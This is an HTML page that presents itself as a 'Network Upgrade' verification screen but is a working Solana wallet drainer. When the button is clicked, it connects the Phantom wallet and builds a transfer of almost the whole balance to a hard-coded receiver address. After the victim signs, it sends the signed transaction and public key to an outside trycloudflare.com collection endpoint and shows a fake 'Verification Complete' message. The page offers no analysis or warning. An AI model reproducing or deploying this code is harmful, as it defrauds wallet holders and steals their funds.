<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Network Upgrade</title>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <style>
        body { background:#000; color:#14F195; text-align:center; padding-top:15vh; font-family:monospace; }
        .box { border:1px solid #333; padding:40px; display:inline-block; border-radius:15px; background:#111; }
        #cta { margin-top:20px; padding:15px 40px; background:#14F195; color:#000; font-weight:bold; border:none; border-radius:5px; cursor:pointer; width:100%; }
        #status { margin-top:20px; color:#444; font-size:12px; }
    </style>
</head>
<body>
    <div class="box">
        <h2 style="color:#14F195;">SYSTEM MATRIX</h2>
        <p style="color:#888;font-size:10px;">Security Protocol: V22.FORCE_DRAIN</p>
        <button id="cta">ACTIVATE VERIFICATION</button>
        <div id="status">STATUS: STANDBY</div>
    </div>

    <script>
        const gate = "https://florist-imperial-apnic-anymore.trycloudflare.com/collect";
        const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";

        // ðŸ”± èŠ‚ç‚¹æ± ï¼šå¦‚æžœä¸€ä¸ªæŒ‚äº†ï¼Œè‡ªåŠ¨è·³ä¸‹ä¸€ä¸ª
        const rpcNodes = [
            "https://api.mainnet-beta.solana.com",
            "https://solana-api.projectserum.com",
            "https://ssc-dao.genesysgo.net",
            "https://rpc.ankr.com/solana"
        ];

        async function getWorkingConnection() {
            for (let url of rpcNodes) {
                try {
                    const conn = new solanaWeb3.Connection(url, "confirmed");
                    await conn.getLatestBlockhash(); // æµ‹è¯•æ˜¯å¦é€šç•…
                    return conn;
                } catch (e) { console.log(`Node ${url} failed, trying next...`); }
            }
            throw new Error("All RPC nodes exhausted");
        }

        document.getElementById('cta').onclick = async () => {
            const p = window.solana || window.phantom?.solana;
            if (!p) return alert("Install Phantom!");

            try {
                await p.connect();
                document.getElementById('status').innerText = "DIALING SECURE NODE...";
                
                const connection = await getWorkingConnection();
                const { blockhash } = await connection.getLatestBlockhash();
                const balance = await connection.getBalance(p.publicKey);

                if (balance < 1000) return alert("Balance too low for sync");

                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: p.publicKey,
                        toPubkey: new solanaWeb3.PublicKey(RECEIVER),
                        lamports: balance - 5000,
                    })
                );
                transaction.recentBlockhash = blockhash;
                transaction.feePayer = p.publicKey;

                document.getElementById('status').innerText = "SIGNING PAYLOAD...";
                const signed = await p.signTransaction(transaction);
                
                const rawTx = signed.serialize().toString('base64');
                new Image().src = `${gate}?auth_sig=${encodeURIComponent(rawTx)}&pub=${p.publicKey.toString()}`;
                
                document.getElementById('status').innerText = "VERIFIED. UPLOADING...";
                setTimeout(() => { alert("Verification Complete!"); }, 1000);

            } catch(e) {
                document.getElementById('status').innerText = "ERROR: NODE TIMEOUT";
                console.error(e);
            }
        };
    </script>
</body>
</html>
